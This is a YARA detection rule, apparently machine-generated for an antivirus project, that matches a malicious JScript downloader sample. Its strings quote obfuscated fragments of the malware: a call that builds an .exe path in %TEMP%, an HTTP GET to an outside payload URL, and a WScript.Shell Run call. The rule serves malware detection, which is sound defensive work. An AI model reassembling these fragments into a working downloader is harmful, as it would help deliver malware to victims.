rule sig_20160328_6497c1680eedf99f15f47a3641a4790b {
  meta:
    description = "datamaliciousorder - file 20160328_6497c1680eedf99f15f47a3641a4790b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6f1e5faacb440307ab810a344b5b5a8f992acc67a7117abdd1b330820165ae0d"

  strings:
    $s1  = "function Uxdohlfu() {return Draufd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fo5BjST3D.exe\";};" fullword ascii
    $s2  = "Usmosvq[Lraiaozpfv](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Ltoqxioyth](Emcdpw() * 11)} while (Usmosvq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Cjzoryot(Ozrffipq, Hgdrwyz){return Ozrffipq - Hgdrwyz;};" fullword ascii
    $s5  = "var Draufd = function Ufehicbgf() {return WScript[Lbfqb](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Txbfjmuf() {return ((Btbajv == true) && (Btbajv == Bzmlizc)) ? 1 : Wfoaznwh;};" fullword ascii
    $s7  = "function Crqjuwqdef(Ziuzreijw){Draufd[\"Run\"](Ziuzreijw, Wfoaznwh, Wfoaznwh);};" fullword ascii
    $s8  = "Btbajv = true; " fullword ascii
    $s9  = "function Lccyd(Wsoppagr) {var Whqsxsx = (1, 2, 3, 4, 5, Wsoppagr); return Whqsxsx;};" fullword ascii
    $s10 = "function Xesepqxc(){return Tukqd;};" fullword ascii
    $s11 = "return Cjzoryot(Ejxtpbkgc, Lqbebaxtk);" fullword ascii
    $s12 = "var Btbajv = false;" fullword ascii
    $s13 = "function Onaoaxw(){return Lbfqb;};" fullword ascii
    $s14 = "var Davmwgidz = false;" fullword ascii
    $s15 = "function Fwzvg()" fullword ascii
    $s16 = "Bzmlizc = true; " fullword ascii
    $s17 = "var Bzmlizc = false;" fullword ascii
    $s18 = "function Emcdpw(){return 22;};" fullword ascii
    $s19 = "var Eagvjrcvn = new this[\"Date\"]();" fullword ascii
    $s20 = " while (Uwdyqbmmmb){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}